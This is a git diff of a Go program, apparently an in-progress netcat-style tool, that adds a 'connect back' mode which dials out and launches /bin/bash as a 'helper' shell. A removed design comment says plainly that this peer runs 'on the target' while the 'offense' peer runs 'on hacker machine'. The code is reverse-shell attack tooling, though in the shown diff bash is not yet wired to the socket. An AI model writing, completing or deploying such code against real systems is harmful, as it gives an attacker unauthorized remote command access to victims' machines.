@@ -1,3 +1,8 @@
+/* TP U ARE HERE:
+- re-organize the channels given new cb shell
+- decide if the shell should be an option vs automatic
+*/
+
 package main
 
 import (
@@ -6,6 +11,7 @@ import (
 	"fmt"
 	"net"
 	"os"
+	"os/exec"
 	"os/signal"
 	"strings"
 	"time"
@@ -25,20 +31,8 @@ func readUserInput(ioReader chan<- string) {
 	}
 }
 
-//func writeToSocket(ioReader <-chan string, socketWriter chan<- bool, connection net.Conn) {
-//	inputToSend := <-ioReader
-//
-//	_, err := connection.Write([]byte(inputToSend))
-//	if err != nil {
-//		socketWriter <- false
-//		return
-//	}
-//	socketWriter <- true
-//}
-
 func readFromSocket(socketReader chan<- []byte, connection net.Conn) {
 	// Read from connection socket:
-
 	for {
 		dataBytes, err := bufio.NewReader(connection).ReadBytes('\n')
 		if err != nil {
@@ -49,17 +43,17 @@ func readFromSocket(socketReader chan<- []byte, connection net.Conn) {
 	}
 }
 
-func writeToStdout(ioWriter chan<- bool, socketReader <-chan []byte) {
-	//fmt.Printf("Socket writer started...\n")
-	bytesToWrite := <-socketReader
-
-	_, err := os.Stdout.Write(bytesToWrite)
+func startHelperShell() (*exec.Cmd, error) { // @Trauma_X_Sella 'connection'
+	bashPath, err := exec.LookPath(`/bin/bash`)
 	if err != nil {
-		ioWriter <- false
-		return
+		fmt.Printf("Error finding bash path: %v\n", err)
+		return nil, err
 	}
 
-	ioWriter <- true
+	bCmd := exec.Command(bashPath)
+
+	var erR error = bCmd.Start()
+	return bCmd, erR
 }
 
 func main() {
@@ -69,7 +63,6 @@ func main() {
 	turdnuggies := flag.Int("p", 40404, "target port") // portFlag @Trauma_x_Sella
 
 	// Parse command line arguments:
-	//                                            error?
 	flag.Parse()
 
 	// Print banner:
@@ -82,6 +75,7 @@ func main() {
 		lPort           string
 		address         string
 		connection      net.Conn
+		cbShell         *exec.Cmd
 	}
 
 	// Initiate peer struct:
@@ -154,19 +148,26 @@ func main() {
 			}
 		}
 	}()
+
+	// If we're the connect_back peer, start 'helper' shell:
+	if thisPeer.connection_type == "connect_back" {
+		connectBackShell, shellStartErr := startHelperShell()
+		if shellStartErr != nil {
+			fmt.Printf("Error starting shell process: %v\n", shellStartErr)
+			thisPeer.connection.Close()
+			os.Exit(1)
+		}
+		thisPeer.cbShell = connectBackShell
+	}
+
 	// IO read & socket write channels (user input will be written to socket)
 	ioReader := make(chan string)
-	//	socketWriter := make(chan bool)
 
 	// IO write & socket read channels (messages from socket will be printed to stdout)
-	//ioWriter := make(chan bool)
 	socketReader := make(chan []byte)
 
 	go readUserInput(ioReader)
-	//go writeToSocket(ioReader, socketWriter, thisPeer.connection)
-
 	go readFromSocket(socketReader, thisPeer.connection)
-	//	go writeToStdout(ioWriter, socketReader)
 
 	for {
 		select {
@@ -184,51 +185,8 @@ func main() {
 			}
 		default:
 			time.Sleep(300 * time.Millisecond)
-			//fmt.Printf("Default: slept for 300 ms\n")
 		}
 	}
 
-	//		select {
-	//
-	//		}
-
-	// Check for success writing to socket and stdout:
-	//	socketWriteSuccess := <-socketWriter
-	//	if !socketWriteSuccess {
-	//		fmt.Printf("Error writing to socket! \n")
-	//	}
-
-	//	stdOutWriteSuccess := <-ioWriter
-	//	if !stdOutWriteSuccess {
-	//		fmt.Printf("Error writing to stdout! \n")
-	//	}
-	//}
-
-	/*
-		if -l is on,
-			net.Listen('tcp', PORT)
-			set connection address for socket to any
-		if not
-			connection address = host flag
-
-
-		struct/ objsect thing (this peer)
-			- connect back (executed on the target)
-				- start the subprocess
-			- offense (exe on hacker machine)
-				- keeep taking user input
-
-
-			- method:
-				func make connection(){
-					if this.type = offense:
-						connection = net.Listener
-						(needs Accept() to actually become a connection)
-					else:
-						connection = net.Dial
-				}
-	*/
-
-	// Try to create connection:
 	return
 }
